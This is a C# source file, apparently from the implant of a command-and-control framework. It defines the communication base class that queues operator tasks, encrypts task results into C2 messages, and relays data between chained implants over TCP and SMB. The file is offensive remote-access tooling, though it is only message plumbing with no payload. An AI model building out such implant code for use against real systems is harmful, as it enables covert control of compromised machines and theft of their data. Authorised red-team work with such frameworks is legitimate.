using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;

namespace Engineer.Models
{
    public abstract class EngCommBase
	{
		public abstract Task Start();
		public abstract void Stop();

		public abstract Task CheckIn();

		public abstract Task PostData();

		internal ConcurrentQueue<EngineerTask> InboundTasks = new ConcurrentQueue<EngineerTask>();
        internal ConcurrentQueue<AssetNotification> InboundNotifs = new ConcurrentQueue<AssetNotification>();
        internal ConcurrentQueue<EngineerTaskResult> OutboundTaskResults = new ConcurrentQueue<EngineerTaskResult>();
		internal ConcurrentQueue<AssetNotification> OutboundAssetNotifs = new ConcurrentQueue<AssetNotification>();

		internal ConcurrentQueue<byte[]> P2POutbound = new ConcurrentQueue<byte[]>();
        internal EngineerMetadata engineerMetadata;

        public bool IsChildConnectedToParent { get; set; } // only used from a child in TCP & SMB, is true if its parent is still connected, false if not, used to issue check-in commands.
        public static int Sleep { get; set;}
		internal IEnumerable<C2Message> GetOutbound()
		{
			var outbound = new List<C2Message>();
			var outboundTasks = new List<EngineerTaskResult>();
			var outboundAssetNotifs = new List<AssetNotification>();
			while (OutboundTaskResults.TryDequeue(out var task))
			{
				outboundTasks.Add(task);
            }
			//serialize the outbound tasks
			if (outboundTasks.Any())
			{
                var message = new C2Message
				{
                    MessageType = 1,
                    Data = Encryption.AES_Encrypt(outboundTasks.JsonSerialize(), "", Program.UniqueTaskKey),
					PathMessage = new List<string> {Program._metadata.Id, Program.ImplantType }
                };
                outbound.Add(message);
            }
			while (OutboundAssetNotifs.TryDequeue(out var assetNotif))
			{
                outboundAssetNotifs.Add(assetNotif);
            }
			if (outboundAssetNotifs.Any())
			{
                var message = new C2Message
				{
                    MessageType = 2,
                    Data = Encryption.AES_Encrypt(outboundAssetNotifs.JsonSerialize(), "", Program.UniqueTaskKey),
					PathMessage =  new List<string> { Program._metadata.Id, Program.ImplantType }
                };
                outbound.Add(message);
            }
            //In the future this this where we can add calls for other message types

            return outbound;
		}

        internal List<byte[]> GetP2POutbound()
        {
	        var P2POutboundList = new List<byte[]>();
	        while(P2POutbound.TryDequeue(out var tcpTaskData))
	        {
		        P2POutboundList.Add(tcpTaskData);
	        }
	        return P2POutboundList;
        }

        public async Task CheckForDataProcess()
        {
            var tasklist = new List<EngineerTask>();
            while (InboundTasks.TryDequeue(out var task))
            {
                tasklist.Add(task);
            }
            Tasking.DealWithTasks(tasklist);
            
            var notiflist = new List<AssetNotification>();
            while(InboundNotifs.TryDequeue(out var notif))
            {
                notiflist.Add(notif);
            }
            Tasking.HandleInboundNotifs(notiflist);
        }

        public void SentData(EngineerTaskResult result, bool isDataChunked)
		{
            if (isDataChunked)
            {
				OutboundTaskResults.Enqueue(result);
				return;
            }
            //if the result is already in the OutboundTaskResults queue then append the result to the existing result and update the status
            if (OutboundTaskResults.Any(t => t.Id == result.Id))
			{
				var existingResult = OutboundTaskResults.FirstOrDefault(t => t.Id == result.Id);
				existingResult.Result = existingResult.Result.Concat(result.Result).ToArray();
				existingResult.Status = result.Status;
			}
			else
			{
				OutboundTaskResults.Enqueue(result);
			}
        }

        public async Task P2PSent(byte[] tcpData)
		{
            P2POutbound.Enqueue(tcpData);
			//Console.WriteLine($"{DateTime.Now} task response in queue size {tcpData.Length}");
        }

		public virtual void Init(EngineerMetadata engineermetadata)
		{
			engineerMetadata = engineermetadata;
		}
	}
}
